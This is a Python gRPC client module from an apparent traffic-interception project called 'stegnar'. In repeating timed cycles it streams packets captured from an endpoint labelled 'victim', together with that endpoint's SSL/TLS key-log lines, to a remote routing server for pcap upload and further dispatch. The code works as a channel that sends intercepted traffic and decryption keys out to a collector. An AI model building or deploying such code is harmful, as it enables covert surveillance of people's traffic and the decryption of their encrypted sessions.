"""
grpc_client.py — Periodic-cycle gRPC stream client to the Routing System.

Design change: Instead of one infinite stream, the client operates in
CYCLES of CYCLE_DURATION seconds:
  1. Open gRPC channel
  2. Stream all captured packets from the queue for CYCLE_DURATION seconds
  3. Close the channel (triggers StreamPayload to return on routing side)
  4. Routing system then processes the closed stream: flushes endpoint_registry,
     hash_cache, pcap upload, CALPA dispatch
  5. Wait RECONNECT_WAIT seconds, then repeat

This guarantees streams are processed regularly and endpoint_registry
stays current.
"""

import asyncio
import logging
import os
import time

import grpc
import grpc.experimental.aio as aio

import sys
sys.path.insert(0, "/app/proto")

import stegnar_pb2 as pb
import stegnar_pb2_grpc as pb_grpc

from sniffer import CapturedPacket

logger = logging.getLogger("stegnar.grpc_client")

ROUTER_ADDR    = os.environ.get("ROUTER_GRPC_ADDR", "routing:50051")
ENDPOINT_ID    = os.environ.get("ENDPOINT_ID",       "victim-unknown")
RECONNECT_WAIT = 3    # seconds between cycles
CYCLE_DURATION = 20   # seconds per streaming cycle (then disconnect so routing flushes)


async def stream_to_router(
    pkt_queue: asyncio.Queue,
    key_queue: asyncio.Queue,
    stop_event: asyncio.Event,
):
    """
    Main loop: cyclic connect → stream → disconnect → repeat.
    Each completed cycle causes routing's StreamPayload RPC to return,
    flushing endpoint_registry, hash_cache, and CALPA dispatch.
    """
    cycle = 0
    while not stop_event.is_set():
        cycle += 1
        try:
            chunks_sent = await _stream_cycle(pkt_queue, key_queue, stop_event, cycle)
            logger.info(
                "[gRPC] Cycle %d complete — sent %d chunks — sleeping %ds before next cycle",
                cycle, chunks_sent, RECONNECT_WAIT,
            )
        except grpc.aio.AioRpcError as e:
            logger.warning("[gRPC] Cycle %d gRPC error: %s — retry in %ds", cycle, e, RECONNECT_WAIT)
        except Exception as e:
            logger.error("[gRPC] Cycle %d unexpected error: %s", cycle, e, exc_info=True)

        if not stop_event.is_set():
            await asyncio.sleep(RECONNECT_WAIT)


async def _stream_cycle(
    pkt_queue: asyncio.Queue,
    key_queue: asyncio.Queue,
    stop_event: asyncio.Event,
    cycle: int,
) -> int:
    """
    Single timed cycle: open channel, stream packets for CYCLE_DURATION seconds,
    then close channel so routing processes the stream.
    Returns number of chunks sent.
    """
    logger.info("[gRPC] Cycle %d — connecting to %s ...", cycle, ROUTER_ADDR)

    chunks_sent = 0
    cycle_deadline = time.monotonic() + CYCLE_DURATION

    async with aio.insecure_channel(ROUTER_ADDR) as channel:
        stub = pb_grpc.RouterServiceStub(channel)

        async def _chunk_generator():
            nonlocal chunks_sent

            while not stop_event.is_set():
                # Stop streaming when cycle time is up (disconnect forces routing to flush)
                if time.monotonic() >= cycle_deadline:
                    logger.debug(
                        "[gRPC] Cycle %d — CYCLE_DURATION reached (%ds), closing stream (%d chunks sent)",
                        cycle, CYCLE_DURATION, chunks_sent,
                    )
                    return

                # Wait for next captured packet (1s timeout to check deadline)
                try:
                    pkt: CapturedPacket = await asyncio.wait_for(
                        pkt_queue.get(), timeout=1.0
                    )
                except asyncio.TimeoutError:
                    continue

                # Drain any available SSL key lines (non-blocking)
                ssl_lines = []
                try:
                    while True:
                        line = key_queue.get_nowait()
                        ssl_lines.append(line)
                except asyncio.QueueEmpty:
                    pass

                # Normalize stream_id (direction-agnostic)
                ep_a = f"{pkt.src_ip}:{pkt.src_port}"
                ep_b = f"{pkt.dst_ip}:{pkt.dst_port}"
                if (pkt.dst_port in (80, 443)) or ep_a > ep_b:
                    stream_id = f"{ep_a}-{ep_b}"
                else:
                    stream_id = f"{ep_b}-{ep_a}"

                chunk = pb.PayloadChunk(
                    endpoint_id = ENDPOINT_ID,
                    stream_id   = stream_id,
                    raw_bytes   = pkt.raw_bytes,
                    sha256      = pkt.sha256,
                    ssl_keylog  = "\n".join(ssl_lines),
                    src_ip      = pkt.src_ip,
                    dst_ip      = pkt.dst_ip,
                    src_port    = pkt.src_port,
                    dst_port    = pkt.dst_port,
                    captured_at = pkt.captured_at,
                )
                chunks_sent += 1
                logger.debug(
                    "[gRPC] Cycle %d chunk %d: stream=%s src=%s:%d dst=%s:%d bytes=%d",
                    cycle, chunks_sent, stream_id,
                    pkt.src_ip, pkt.src_port, pkt.dst_ip, pkt.dst_port, len(pkt.raw_bytes),
                )
                yield chunk

        ack: pb.StreamAck = await stub.StreamPayload(_chunk_generator())
        logger.info(
            "[gRPC] Cycle %d ACK — ok=%s chunks_recv=%d msg=%s",
            cycle, ack.ok, ack.chunks_recv, ack.message,
        )

    return chunks_sent
